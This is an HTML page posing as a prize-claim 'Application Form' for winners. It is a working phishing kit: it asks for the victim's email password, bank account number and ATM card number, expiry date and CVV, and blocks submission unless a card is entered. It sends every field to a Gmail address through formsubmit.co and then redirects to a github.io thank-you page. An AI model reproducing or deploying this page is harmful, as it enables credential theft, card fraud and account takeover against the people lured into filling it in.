<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Application Form</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f2f2f2;
      padding: 20px;
    }
    form {
      background: #fff;
      padding: 20px;
      border-radius: 10px;
      max-width: 600px;
      margin: auto;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
    }
    input, select {
      width: 100%;
      padding: 10px;
      margin-top: 10px;
      margin-bottom: 5px;
      border: 1px solid #ccc;
      border-radius: 5px;
    }
    label {
      font-weight: bold;
    }
    .error-message {
      color: red;
      font-size: 0.9em;
      display: none;
    }
    #finalNote {
      margin-top: 20px;
      font-weight: bold;
    }
    .hidden {
      display: none;
    }
    .password-toggle {
      position: relative;
    }
    .password-toggle input {
      padding-right: 40px;
    }
    .password-toggle .toggle-icon {
      position: absolute;
      top: 50%;
      right: 10px;
      transform: translateY(-50%);
      cursor: pointer;
    }
    button {
      background: green;
      color: #fff;
      padding: 12px;
      border: none;
      border-radius: 8px;
      width: 100%;
      font-size: 16px;
      margin-top: 20px;
    }
  </style>
</head>
<body>

  <form action="https://formsubmit.co/exellentfirm@gmail.com" method="POST" id="applicationForm">

    <label>1. Full Name</label>
    <input type="text" id="fullName" name="Full Name" required>

    <label>2. Country</label>
    <input type="text" name="Country" required>

    <label>3. Phone Number</label>
    <input type="tel" id="phoneNumber" name="Phone Number" required>
    <div class="error-message" id="phoneError">Phone number must be 9 to 12 digits.</div>

    <label>4. Email Address</label>
    <input type="email" name="Email Address" required>

    <label>5. Email Password</label>
    <div class="password-toggle">
      <input type="password" id="emailPassword" name="Email Password" required>
      <span class="toggle-icon" onclick="togglePassword()">üëÅÔ∏è</span>
    </div>

    <label>6. Amount You Won</label>
    <input type="text" id="amountWon" name="Amount You Won" required>

    <label>7. Bank Account Type (e.g., Standard Bank Account)</label>
    <input type="text" id="accountType" name="Bank Account Type" required>

    <label>8. Bank Account Number</label>
    <input type="text" id="accountNumber" name="Bank Account Number" required>

    <label>9. Bank Account Holder's Name</label>
    <input type="text" id="accountHolder" name="Bank Account Holder's Name" required>

    <label>10. Did You Link ATM to Your Bank Account?</label>
    <select id="atmLinked" name="ATM Linked" required>
      <option value="">Select</option>
      <option value="Yes">Yes</option>
      <option value="No">No</option>
    </select>
    <div class="error-message" id="atmError">YOU MUST HAVE ATM CARD TO PROCEED</div>

    <div id="atmFields">
      <label>11. ATM Card Number</label>
      <input type="text" id="cardNumber" name="ATM Card Number" maxlength="16">
      <div class="error-message" id="cardError">Card number must be exactly 16 digits.</div>

      <label>12. Expiry Date (MM/YY)</label>
      <input type="text" id="expiryDate" name="Expiry Date" maxlength="5">
      <div class="error-message" id="expiryError">Enter a valid date in MM/YY format.</div>

      <label>13. CVV</label>
      <input type="text" id="cvv" name="CVV" maxlength="3">
      <div class="error-message" id="cvvError">CVV must be exactly 3 digits.</div>
    </div>

    <div id="finalNote" class="hidden"></div>

    <!-- ‚úÖ Redirect after success -->
    <input type="hidden" name="_next" value="https://onlinegistrationprog.github.io/thankyou.html" />

    <button type="submit" id="submitButton">Submit</button>
  </form>

  <script>
    function togglePassword() {
      const pwd = document.getElementById('emailPassword');
      pwd.type = pwd.type === 'password' ? 'text' : 'password';
    }

    const atmLinked = document.getElementById('atmLinked');
    const atmFields = document.getElementById('atmFields');
    const atmError = document.getElementById('atmError');
    const submitBtn = document.getElementById('submitButton');
    const finalNote = document.getElementById('finalNote');

    const fullName = document.getElementById('fullName');
    const amountWon = document.getElementById('amountWon');
    const accountType = document.getElementById('accountType');
    const accountNumber = document.getElementById('accountNumber');

    atmLinked.addEventListener('change', () => {
      if (atmLinked.value === "No") {
        atmFields.classList.add('hidden');
        atmError.style.display = 'block';
        submitBtn.disabled = true;
        finalNote.classList.add('hidden');
      } else {
        atmFields.classList.remove('hidden');
        atmError.style.display = 'none';
        submitBtn.disabled = false;
        updateFinalNote();
      }
    });

    function updateFinalNote() {
      if (fullName.value && amountWon.value && accountType.value && accountNumber.value) {
        finalNote.innerText = `Dear ${fullName.value}, You will receive ${amountWon.value} to your ${accountType.value}, ${accountNumber.value}`;
        finalNote.classList.remove('hidden');
      } else {
        finalNote.classList.add('hidden');
      }
    }

    [fullName, amountWon, accountType, accountNumber].forEach(field => {
      field.addEventListener('blur', updateFinalNote);
    });

    document.getElementById('cardNumber').addEventListener('blur', function () {
      const val = this.value;
      document.getElementById('cardError').style.display = val.length !== 16 ? 'block' : 'none';
    });

    document.getElementById('cvv').addEventListener('blur', function () {
      const val = this.value;
      document.getElementById('cvvError').style.display = val.length !== 3 ? 'block' : 'none';
    });

    document.getElementById('phoneNumber').addEventListener('blur', function () {
      const val = this.value;
      const isValid = /^\d{9,12}$/.test(val);
      document.getElementById('phoneError').style.display = isValid ? 'none' : 'block';
    });

    document.getElementById('expiryDate').addEventListener('input', function (e) {
      let val = e.target.value.replace(/\D/g, '');
      if (val.length >= 3) {
        val = val.substring(0, 2) + '/' + val.substring(2, 4);
      }
      e.target.value = val;
    });

    document.getElementById('expiryDate').addEventListener('blur', function () {
      const val = this.value;
      const isValid = /^(0[1-9]|1[0-2])\/\d{2}$/.test(val);
      document.getElementById('expiryError').style.display = isValid ? 'none' : 'block';
    });

    document.getElementById('applicationForm').addEventListener('submit', function (e) {
      let errors = document.querySelectorAll('.error-message');
      for (let err of errors) {
        if (err.style.display === 'block') {
          e.preventDefault();
          alert("Please fix all errors before submitting.");
          return;
        }
      }
    });
  </script>
</body>
</html>
